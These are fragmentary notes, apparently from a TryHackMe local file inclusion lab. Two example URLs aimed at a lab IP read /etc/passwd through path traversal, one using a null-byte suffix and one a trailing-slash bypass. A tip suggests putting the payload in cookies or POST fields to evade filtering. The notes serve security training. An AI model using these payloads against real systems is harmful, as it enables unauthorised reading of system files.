...
e.g. `http://10.10.127.31/lab4.php?file=../../../etc/passwd%00`
...
e.g. `http://10.10.127.31/lab4.php?file=../../../etc/passwd/.`\
...
<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" alt=""><figcaption></figcaption></figure>
...
you can use cookie values or change form method to post and try that. because it will be handled elsewhere and it might lack propper filtering.
